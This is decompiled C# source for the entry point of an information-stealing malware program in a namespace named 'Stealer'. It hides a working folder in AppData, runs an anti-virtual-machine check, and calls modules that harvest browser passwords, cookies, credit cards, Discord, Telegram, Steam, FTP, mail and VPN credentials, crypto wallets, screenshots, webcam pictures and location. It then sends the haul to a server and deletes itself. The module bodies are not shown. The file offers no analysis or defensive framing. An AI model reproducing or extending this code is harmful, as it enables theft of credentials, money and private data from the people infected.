using System;
using System.IO;
using System.Threading.Tasks;
using Stealer.modules;

namespace Stealer
{
	// Token: 0x0200001D RID: 29
	internal class Program
	{
		// Token: 0x0600009B RID: 155 RVA: 0x000081F0 File Offset: 0x000063F0
		private static void Main(string[] args)
		{
			try
			{
				Task.Factory.StartNew(delegate()
				{
					CheckPovt.CheckPril();
				}).Wait();
				if (File.Exists(Program.path))
				{
					File.Delete(Program.path);
				}
				DirectoryInfo directoryInfo = Directory.CreateDirectory(Program.path);
				directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.Directory);
				Task.Factory.StartNew(delegate()
				{
					VirtualMachine.CheckVM();
				}).Wait();
				Task.Factory.StartNew(delegate()
				{
					Program.Helper();
				}).Wait();
				Task.Factory.StartNew(delegate()
				{
					SendToServer.StratSend();
				}).Wait();
				Task.Factory.StartNew(delegate()
				{
					Delete.SelfDelete();
				}).Wait();
			}
			catch
			{
			}
		}

		// Token: 0x0600009C RID: 156 RVA: 0x00008324 File Offset: 0x00006524
		private static void Helper()
		{
			Passwords.GetPasswords();
			FireFox.GetPasswordFirefox();
			Internet_Explorer.Start();
			Cookies.GetCookies();
			Autofill.GetCAutofills();
			Clipboard.GetText();
			CreditCards.GetCreditCards();
			History.GetHistory();
			USB.GetUSB();
			DesktopFiles.Inizialize();
			Discord.GetDiscord();
			Skype.GetSkype();
			FTPClient.GetFileZilla();
			ImClient.GetImClients();
			MailClient.GoMailClient();
			VPNClient.GetVPN();
			HardwareInfo.GoInfo();
			ScreenDektop.GetScreenshot("screenshot.jpg");
			Steam.CopySteam();
			Telegram.GetTelegram();
			WebCam.GetWebCamPicture();
			Wallets.GetWallets();
			Location.GetLocation(false);
		}

		// Token: 0x04000046 RID: 70
		public static string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\PackLogsRezo";

		// Token: 0x04000047 RID: 71
		public static bool repeated_logs = true;
	}
}
